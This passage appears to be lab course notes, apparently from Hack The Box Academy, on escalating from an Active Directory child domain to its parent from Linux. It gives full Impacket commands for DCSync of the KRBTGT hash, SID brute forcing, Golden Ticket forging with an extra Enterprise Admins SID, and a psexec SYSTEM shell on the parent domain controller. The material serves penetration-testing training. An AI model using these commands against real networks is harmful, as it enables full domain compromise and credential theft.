To do this attack from linux , we'll still need to gather the same bits of information:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain
- The SID of the Enterprise Admins group of the root domain

Once we have complete control of the child domain, `LOGISTICS.INLANEFREIGHT.LOCAL`, we can use `secretsdump.py` to DCSync and grab the NTLM hash for the KRBTGT account.

#### Performing DCSync with secretsdump.py

	AstraX01@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

Next, we can use [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain.

#### Performing SID Brute Forcing using lookupsid.py

	AstraX01@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240

#### Looking for the Domain SID

	AstraX01@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

	Password:

	[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689

#### Grabbing the Domain SID & Attaching to Enterprise Admin's RID

	AstraX01@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

Once again, we will use the non-existent user `hacker` to forge our Golden Ticket.

Next, we can use [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by `-domain-sid`) and the parent domain (specified by `-extra-sid`).

#### Constructing a Golden Ticket using ticketer.py

	AstraX01@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

#### Setting the KRB5CCNAME Environment Variable

The ticket will be saved down to our system as a [credential cache (ccache)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file, which is a file used to hold Kerberos credentials.

	AstraX01@htb[/htb]$ export KRB5CCNAME=hacker.ccache

#### Getting a SYSTEM shell using Impacket's psexec.py

We can check if we can successfully authenticate to the parent domain's Domain Controller using [Impacket's version of Psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.

	AstraX01@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

	C:\Windows\system32> whoami
	nt authority\system

	C:\Windows\system32> hostname
	ACADEMY-EA-DC01


---
#### Performing the Attack with raiseChild.py

Impacket also has the tool [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py), which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest.

	AstraX01@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

Though tools such as `raiseChild.py` can be handy and save us time

